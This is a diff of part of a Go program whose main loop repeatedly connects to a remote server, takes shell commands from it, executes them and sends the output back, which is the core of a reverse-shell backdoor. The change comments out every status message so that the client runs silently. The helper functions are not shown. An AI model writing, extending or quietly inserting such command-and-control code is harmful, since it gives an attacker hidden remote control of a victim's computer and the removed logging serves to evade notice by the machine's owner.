@@ -21,29 +21,29 @@ func main() {
 	for {
 		connection, connection_error := connect_to_server() //connecting to the server
 		if connection_error != nil {
-			fmt.Println(";A connection error occurred; ", connection_error.Error())
+			//fmt.Println(";A connection error occurred; ", connection_error.Error())
 
 			continue
 		} else {
-			fmt.Println(";Connected to the server;")
+			//fmt.Println(";Connected to the server;")
 
 			for {
 				command, receiving_error := take_command_from_server(connection) //receiving a cmd command from the server
 				if receiving_error != nil {
-					fmt.Println(";A data reading error occurred; ", receiving_error.Error())
+					//fmt.Println(";A data reading error occurred; ", receiving_error.Error())
 
 					break
 				} else {
-					fmt.Println(";The command has been received successfully;")
+					//fmt.Println(";The command has been received successfully;")
 
 					output, execution_error := execute_command(command) //executing the cmd command
 					if execution_error != nil {
-						fmt.Println(";A cmd command execution error occurred; ", execution_error.Error())
+						//fmt.Println(";A cmd command execution error occurred; ", execution_error.Error())
 
 					} else {
 						send_cmd_output_to_server(connection, output) //sending the output of the cmd command to the server
 					
-						fmt.Println(";The command has been run succesfully;")
+						//fmt.Println(";The command has been run succesfully;")
 
 						break
 					}		
